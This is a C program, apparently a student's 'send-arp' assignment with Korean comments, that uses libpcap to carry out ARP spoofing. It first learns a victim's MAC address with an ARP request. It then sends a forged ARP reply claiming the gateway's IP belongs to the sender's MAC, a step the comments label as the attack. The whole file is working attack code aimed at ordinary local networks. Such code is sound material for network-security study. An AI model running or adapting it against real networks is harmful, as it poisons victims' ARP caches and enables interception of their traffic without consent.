#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <net/if.h>
#include <pcap.h>

//이거 안 쓰면 구조체에 이상한 패딩 껴서 에러 난다고 함
 
#pragma pack(push, 1)
struct EthHdr {
    uint8_t  dmac[6];
    uint8_t  smac[6];
    uint16_t type;
};
struct ArpHdr {
    uint16_t hrd;
    uint16_t pro;
    uint8_t  hln;
    uint8_t  pln;
    uint16_t op;
    uint8_t  smac[6];
    uint8_t  sip[4];
    uint8_t  tmac[6];
    uint8_t  tip[4];
};
struct EthArpPacket {
    struct EthHdr eth;
    struct ArpHdr arp;
};
#pragma pack(pop)
//인터넷에 있는 내 mac주소랑 ip주소 가져오는 코드 가져왔습니다

void get_my_mac(const char* iface, uint8_t* mac) {
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    struct ifreq ifr;
    strncpy(ifr.ifr_name, iface, IFNAMSIZ - 1);
    ioctl(sock, SIOCGIFHWADDR, &ifr);
    close(sock);
    memcpy(mac, ifr.ifr_hwaddr.sa_data, 6);
}

void get_my_ip(const char* iface, uint8_t* ip) {
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    struct ifreq ifr;
    strncpy(ifr.ifr_name, iface, IFNAMSIZ - 1);
    ioctl(sock, SIOCGIFADDR, &ifr);
    close(sock);
    struct sockaddr_in* sa = (struct sockaddr_in*)&ifr.ifr_addr;
    memcpy(ip, &sa->sin_addr.s_addr, 4);
}
//usage 함수로 제 무선랜카드랑 제가 영상에서 사용할 제 친구 ip주소 그리고 ping 1.1.1.1로 보낼 핫스팟 gateway의ip 주소 입니다
void usage() {
    printf("syntax: send-arp <interface> <victim ip> <gateway ip>\n");
    printf("sample: send-arp wlx90de800e4af1 172.20.10.10 172.20.10.1\n");
}

int main(int argc, char* argv[]) {
    if (argc != 4) {
        usage();
        return -1;
    }

    char* iface       = argv[1];
    char* victim_str  = argv[2];   
    char* gateway_str = argv[3];  

    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(iface, BUFSIZ, 1, 1000, errbuf);
    if (handle == NULL) {
        printf("pcap_open_live error: %s\n", errbuf);
        return -1;
    }

    //제 MAC, IP
    uint8_t my_mac[6];
    uint8_t my_ip[4];
    get_my_mac(iface, my_mac);
    get_my_ip(iface, my_ip);

    // 뒤에서 쉽게 하기 위해 문자열 ip로위에서 받은걸 배열로 바꿔주는 sscanf함수
    uint8_t victim_ip[4];
    uint8_t gateway_ip[4];
    sscanf(victim_str,  "%hhu.%hhu.%hhu.%hhu",
           &victim_ip[0],  &victim_ip[1],  &victim_ip[2],  &victim_ip[3]);
    sscanf(gateway_str, "%hhu.%hhu.%hhu.%hhu",
           &gateway_ip[0], &gateway_ip[1], &gateway_ip[2], &gateway_ip[3]);

    //  ARP Request 보내서 victim의 mac주소 알아내기
    struct EthArpPacket arp_req;
    memset(arp_req.eth.dmac, 0xff, 6);     
    memcpy(arp_req.eth.smac, my_mac, 6);
    arp_req.eth.type = htons(0x0806);
    arp_req.arp.hrd  = htons(1);
    arp_req.arp.pro  = htons(0x0800);
    arp_req.arp.hln  = 6;
    arp_req.arp.pln  = 4;
    arp_req.arp.op   = htons(1);           
    memcpy(arp_req.arp.smac, my_mac,    6);
    memcpy(arp_req.arp.sip,  my_ip,     4);
    memset(arp_req.arp.tmac, 0x00,      6);
    memcpy(arp_req.arp.tip,  victim_ip, 4);
    pcap_sendpacket(handle, (const u_char*)&arp_req, sizeof(struct EthArpPacket));

   // 총 3가지 체크 : arp type인지, reply인지, victim의 ip맞는지 그럴경우에만 mac주소 받기 (이거 안 체크하면 이상한 모든 패킷의 mac 주소 받을지 모른다고 함)
    uint8_t victim_mac[6];
    while (1) {
        struct pcap_pkthdr* pkt_info;
        const u_char* raw_pkt;
        int caught = pcap_next_ex(handle, &pkt_info, &raw_pkt);
        if (caught == 0) continue;
        if (caught < 0)  break;

        struct EthArpPacket* income = (struct EthArpPacket*)raw_pkt;
        if (ntohs(income->eth.type) == 0x0806 &&
            ntohs(income->arp.op)   == 2      &&
            memcmp(income->arp.sip, victim_ip, 4) == 0) {
            memcpy(victim_mac, income->arp.smac, 6);
            break;
        }
    }

    //  ARP Reply: 공격하는부분
    struct EthArpPacket arp_rep;
    memcpy(arp_rep.eth.dmac, victim_mac,  6);
    memcpy(arp_rep.eth.smac, my_mac, 6);
    arp_rep.eth.type = htons(0x0806);
    arp_rep.arp.hrd  = htons(1);
    arp_rep.arp.pro  = htons(0x0800);
    arp_rep.arp.hln  = 6;
    arp_rep.arp.pln  = 4;
    arp_rep.arp.op   = htons(2);             
    memcpy(arp_rep.arp.smac, my_mac,      6);
    memcpy(arp_rep.arp.sip,  gateway_ip,  4); 
    memcpy(arp_rep.arp.tmac, victim_mac,  6);
    memcpy(arp_rep.arp.tip,  victim_ip,   4);

    int send_result = pcap_sendpacket(handle, (const u_char*)&arp_rep, sizeof(struct EthArpPacket));
    if (send_result != 0) {
        printf("send failed: %s\n", pcap_geterr(handle));
    }

    pcap_close(handle);
    return 0;
}
